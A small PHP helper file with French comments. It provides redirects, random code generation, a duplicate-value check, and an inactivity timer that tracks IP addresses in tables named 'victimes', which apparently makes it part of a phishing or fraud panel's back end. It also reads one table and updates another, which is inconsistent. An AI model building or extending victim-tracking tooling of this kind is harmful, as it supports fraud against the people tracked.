<?php



// Fonction de redirection rapide
	if(!function_exists('redirect')){
		function redirect($page){
			header("location:" . $page); 
			exit();
		}
	}

	//  Génerateur de valeurs
	if(!function_exists('generer')){
		function generer($length)
		{
			$alphabet ="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
			return substr( str_shuffle(str_repeat($alphabet,$length )),0, $length);
		}
	}

	
	// vérification des variable dans la db
	if(!function_exists('is_already_in_use')){
		function is_already_in_use($field, $value, $table){
			global $db;
			$q = $db->prepare ("SELECT id_victime FROM $table WHERE $field = ?");
			$q -> execute ([$value]);	
			$count = $q->rowCount();
			// $q-> closeClursor();
			return $count;
		}
	}


	// Fonction de verification de la connectivité
	if(!function_exists('checkUserActivity')){
		function checkUserActivity($conn, $ip)
		{
			$timeout = 120; // 2 minutes en secondes
			
			// Vérifier si l'utilisateur a une entrée dans la base de données
			$sql = "SELECT status, created FROM utilisateurs WHERE ip = :ip";
			$stmt = $conn->prepare($sql);
			$stmt->bindParam(':ip', $ip);
			$stmt->execute();
			
			$row = $stmt->fetch(PDO::FETCH_ASSOC);
			
			if ($row) {
				$status = $row["status"];
				
				// Vérifier si le statut est ON depuis plus de 2 minutes
				if ($status === "ON") {
					$lastUpdate = strtotime($row["created"]);
					$currentTime = time();
					
					if ($currentTime - $lastUpdate >= $timeout) {
						// Mettre à jour le statut de l'utilisateur en OFF
						$sql = "UPDATE victimes SET status = 'OFF' WHERE ip = :ip";
						$stmt = $conn->prepare($sql);
						$stmt->bindParam(':ip', $ip);
						$stmt->execute();
					}
				}
			}
		}
	}


